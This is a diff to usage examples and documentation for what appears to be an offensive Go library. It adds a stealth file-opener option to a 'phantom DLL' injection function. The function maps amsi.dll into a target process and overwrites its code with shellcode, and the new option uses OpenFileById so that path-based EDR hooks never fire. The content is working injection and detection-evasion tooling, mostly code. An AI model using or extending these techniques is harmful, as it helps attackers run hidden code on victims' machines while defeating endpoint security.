@@ -54,7 +54,11 @@ func main() {
     shellcode := []byte{0x90, 0x90, 0xCC}
 
     // Inject into PID 1234 using amsi.dll as the phantom module.
-    if err := inject.PhantomDLLInject(1234, "amsi.dll", shellcode); err != nil {
+    // 4th arg is an optional stealthopen.Opener — nil = path-based
+    // CreateFile of System32\amsi.dll; pass a *stealthopen.Stealth
+    // to route BOTH the PE-parse read AND the NtCreateSection HANDLE
+    // through OpenFileById, bypassing path-based EDR file hooks.
+    if err := inject.PhantomDLLInject(1234, "amsi.dll", shellcode, nil); err != nil {
         log.Fatal(err)
     }
 }
@@ -92,7 +96,12 @@ func main() {
 
     // 3. Phantom DLL injection using a rarely-loaded DLL.
     //    The mapped region appears as a legitimate amsi.dll image.
-    if err := inject.PhantomDLLInject(targetPID, "amsi.dll", shellcode); err != nil {
+    //    Pre-capture the Object ID to also defeat path-based CreateFile
+    //    hooks on the amsi.dll open.
+    sys32 := filepath.Join(os.Getenv("SYSTEMROOT"), "System32")
+    stealth, _ := stealthopen.NewStealth(filepath.Join(sys32, "amsi.dll"))
+
+    if err := inject.PhantomDLLInject(targetPID, "amsi.dll", shellcode, stealth); err != nil {
         log.Fatal(err)
     }
 
@@ -128,5 +137,10 @@ func main() {
 // PhantomDLLInject creates a section from a legitimate System32 DLL,
 // maps it into the target process, and overwrites the .text section
 // with shellcode. The memory scanner sees a file-backed image.
-func PhantomDLLInject(pid int, dllName string, shellcode []byte) error
+//
+// opener is optional (nil = path-based os.Open + CreateFile). Pass a
+// *stealthopen.Stealth pre-captured for the target System32 DLL to
+// route the PE-parse read AND the NtCreateSection HANDLE through
+// OpenFileById — path-based EDR hooks on System32 DLL opens never fire.
+func PhantomDLLInject(pid int, dllName string, shellcode []byte, opener stealthopen.Opener) error
 ```
